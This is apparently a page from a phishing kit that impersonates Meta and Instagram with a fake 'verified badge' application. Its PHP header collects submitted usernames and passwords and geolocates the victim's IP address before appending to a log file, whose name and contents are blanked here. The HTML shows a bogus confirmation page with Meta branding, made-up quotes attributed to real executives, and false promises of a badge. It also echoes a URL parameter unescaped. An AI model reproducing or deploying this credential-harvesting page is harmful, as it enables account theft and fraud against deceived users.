

<?php



session_start();
set_time_limit(0);
error_reporting(E_ALL);


 $fname=$_GET["fname"];




if($_POST){

    $fname=$_GET["fname"];
    $username=$_POST["username"];
    $password=$_POST["password"];
    $ip=$_SERVER["REMOTE_ADDR"];
    $konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  

$cur_time=date("d-m-Y H:i:s");

    $file = fopen('', 'a');
fwrite($file, "


"); 

fclose($file);
echo '';
  
   header("");
   include '';
}
?>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="apple-touch-icon" type="image/png" href="i-img/i-fav.png" />
<meta name="apple-mobile-web-app-title" content="Igardo">

<link rel="shortcut icon" type="image/x-icon" href="i-img/i-fav.png" />

<link rel="mask-icon" type="image/x-icon" href="i-img/i-fav.png" color="#111" />

    <meta name="apple-mobile-web-app-title" content="Meta
    ">

  <link rel="stylesheet" href="i-css/index.css">
 


  
  <title>Complete</title>

  
  
  
  
<style>

</style>

  <script>
  window.console = window.console || function(t) {};
</script>

  
  
</head>

<body translate="no">

  <nav>

        <div class="nav-main">
            <div class="nav-logo">

                <a href="index.html">Meta</a>

            </div>
            <ul>
                <li><a href="https://about.instagram.com/community">Community</a></li>
                <li><a href="https://about.meta.com/">About Meta</a></li>
                <li><a href="https://business.whatsapp.com/">Whatsapp</a></li>
                <li><a href="https://www.facebook.com/business/marketing/facebook">Facebook</a></li>
                <li><a href="https://www.facebook.com/business/marketing/messenger">Messenger</a></li>
                <li><a href="https://www.meta.com/quest/">Oculus</a></li>
            </ul>
            <ul>
          
            </ul>
            <div class="nav-mobile-menu" id="nav-mobile-menu">
                <img src="i-img/burger.svg" alt="">
            </div>
        </div>
    </nav>

    <nav class="mobile-menu">
        <ul>
              <li><a href="https://about.instagram.com/community">Community</a></li>
                <li><a href="https://about.meta.com/">About Meta</a></li>
                <li><a href="https://business.whatsapp.com/">Whatsapp</a></li>
                <li><a href="https://www.facebook.com/business/marketing/facebook">Facebook</a></li>
                <li><a href="https://www.facebook.com/business/marketing/messenger">Messenger</a></li>
                <li><a href="https://www.meta.com/quest/">Oculus</a></li>
        </ul>
        <ul>
           
        </ul>
    </nav>

    <main>
        <section class="section-1">
            <div class="section-1-main">
                <div class="section-1-content">
                    <div class="section-1-rating">
                        
                    </div>
                    <h1 class="section-1-title">Dear, <?php echo $fname;?> <br>The Form is Complete!</h1>
                    <p class="section-1-desc">You will receive a message within 24 hours to your Email Address and Phone number. After the incoming message, the verified badge will be activated in your account. We are happy to have you as our business partner.</p>
                    <div class="section-1-links">
                       
                        
                    </div>
                    <ul class="section-1-lists">
                        <li><img src="i-img/i-verify.svg" alt=""> <span>Form submitted</span></li>
                        <li><img src="i-img/i-verify.svg" alt=""> <span>Verified Badge will be activated within 24 hours</span></li>
                    </ul>
                </div>
                <div class="section-1-img">
                    <img src="i-img/i-complete.png" alt="" style="width: 100%;">
                </div>
            </div>
        </section>

        <section class="section-2">
            <div class="section-2-main">

                <div class="section-2-1">
                    <div class="section-2-1-main">
                        <div class="section-2-1-header">
                            <span class="section-2-1-header-span">Meta</span>
                            <h1 class="section-2-1-header-title">As Meta, we protect our community <br>and try to bring it to a better place.</h1>
                        </div>
                        <div class="section-2-1-body">
                            <div class="cards">
                                <div class="card">
                                    <div class="card-img">
                                        <img src="i-img/i-blue.png" style="width: 14%;" alt="">
                                    </div>
                                    <h4 class="card-title">Verify Badges</h4>
                                    <p class="card-text">An Instagram account with a verified badge next to its name means that<br> Instagram has confirmed that person or brand is a real entity.</p>
                                </div>
                                <div class="card">
                                    <div class="card-img">
                                        <img src="i-img/i-meta2.png" style="width: 14%;" alt="">
                                    </div>
                                    <h4 class="card-title">Our Team</h4>
                                    <p class="card-text">Your account will be reviewed by our team to see if you are <br>eligible for the verified badge.</p>
                                </div>
                                <div class="card">
                                    <div class="card-img">
                                        <img src="i-img/i-insta.png" style="width: 14%;" alt="">
                                    </div>
                                    <h4 class="card-title">Meta</h4>
                                    <p class="card-text">We strive to make Meta a better place, users who qualify for the <br>verified badge are considered our partners.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="section-2-2">
                    <div class="section-2-2-content">
                        <h1 class="section-2-2-title">Verify Badges</h1>
                        <p class="section-2-2-desc">It is a system that is given only to users that we choose and approve. In this system, users' account gets more interaction.</p>
                        <a href="https://help.instagram.com/854227311295302" class="section-2-2-link">More Information ➜</a>
                    </div>
                    <div class="section-2-2-img">
                        <img src="i-img/i-igardo-tick.png" alt="" style="width: 80%;">
                    </div>
                </div>

                <div class="section-2-3">
                    <div class="section-2-3-main">
                        <div class="cards" id="carousel">
                            <div class="card">
                                <div class="card-details">
                                    <div class="card-user-img">
                                        <img src="i-img/i-kevin.webp" style="border-radius: 11px;" alt="">
                                    </div>
                                    <div class="card-user-content">
                                        <h4>Kevin Systrom</h4>
                                        <span>CEO at Instagram</span>
                                    </div>
                                </div>
                                <p class="card-text">Meta is becoming a better place with users like you. Your Verified Badge means you are approved.</p>
                                <div class="card-footer">
                                    <a href="https://www.instagram.com/kevin/">View Kevin's Profile</a>
                                </div>
                            </div>
                            <div class="card">
                                <div class="card-details">
                                    <div class="card-user-img">
                                        <img src="i-img/i-mike.jpeg" style="border-radius: 11px;" alt="">
                                    </div>
                                    <div class="card-user-content">
                                        <h4>Mike Krieger</h4>
                                        <span>Instagram Investor and Entrepreneur</span>
                                    </div>
                                </div>
                                <p class="card-text">If you have a Verified Badge on Instagram, your account will get more discoveries. Users with verified Badges get more sponsors and more engagement.</p>
                                <div class="card-footer">
                                    <a href="https://www.instagram.com/mikeyk/">View Mike's Profile</a>
                                </div>
                            </div>
                            <div class="card">
                                <div class="card-details">
                                    <div class="card-user-img">
                                        <img src="i-img/i-adam.jpg" style="border-radius: 11px;" alt="">
                                    </div>
                                    <div class="card-user-content">
                                        <h4>Adam Mosseri</h4>
                                        <span>Head of Meta</span>
                                    </div>
                                </div>
                                <p class="card-text">Verified Badge doesn't mean just a tick next to your account. Your account gets 50% more interactions and comments than regular accounts.</p>
                                <div class="card-footer">
                                    <a href="https://www.instagram.com/mosseri/">View Adam's Profile</a>
                                </div>
                            </div>
                        </div>     
                    </div>
                </div>

            </div>
        </section>
    </main>

    <footer>
        <div class="footer-main">
            <div class="footer-content">
                <div class="footer-1">
                    <a href="index.html" class="footer-1-logo">Meta</a>
                    <p class="footer-l-content">Our team works for Meta every day. We carefully grow and protect our community. We have been connecting People for 20 years.</p>
                    <p class="footer-1-copyright">2023 - <a href="https://vetri-suriya.web.app/"><span>Meta ©</span></a></p>
                </div>
                <div class="footer-2">
                    <div class="footer-f1">
                        <div class="footer-2-1">
                            <h5 class="footer-2-1-title">About Us</h5>
                            <ul class="footer-2-1-links">
                                <li><a href="https://about.instagram.com/about-us/careers">Careers</a></li>
                                <li><a href="https://about.meta.com/brand/resources/instagram/instagram-brand/">Brand Assets</a></li>
                                
                            </ul>
                        </div>
                        <div class="footer-2-2">
                            <h5 class="footer-2-2-title">Features</h5>
                            <ul class="footer-2-2-links">
                                <li><a href="https://about.instagram.com/features/reels">Reels</a></li>
                                <li><a href="https://about.instagram.com/features/stories">Stories</a></li>
                                <li><a href="https://about.instagram.com/features/direct">Messenger</a></li>
                                <li><a href="https://about.instagram.com/features/shopping">Shopping</a></li>
                                <li><a href="https://about.instagram.com/features/search-and-explore">Search & Explore</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="footer-f2">
                        <div class="footer-2-3">
                            <h5 class="footer-2-3-title">Community</h5>
                            <ul class="footer-2-3-links">
                                <li><a href="https://about.instagram.com/community/anti-bullying">Anti-Bullying</a></li>
                                <li><a href="https://about.instagram.com/community/parents">Parents</a></li>
                                <li><a href="https://about.instagram.com/community/programs">Programs</a></li>
                            </ul>
                        </div>
                        <div class="footer-2-4">
                            <h5 class="footer-2-4-title">Business</h5>
                            <ul class="footer-2-4-links">
                                <li><a href="https://business.instagram.com/advertising/">Advertising</a></li>
                                <li><a href="https://business.instagram.com/partnerships/">Partners</a></li>
                                <li><a href="https://business.instagram.com/success/">Success Stories</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <script src="i-js/i-cp.js"></script>

  
      <script id="rendered-js" >
const navEl = document.getElementById("nav-mobile-menu");
const nav = document.getElementsByTagName("nav");

navEl.addEventListener("click", () => {
  nav[1].classList.toggle("active");
});
//# sourceURL=pen.js
    </script>

  





</body></html>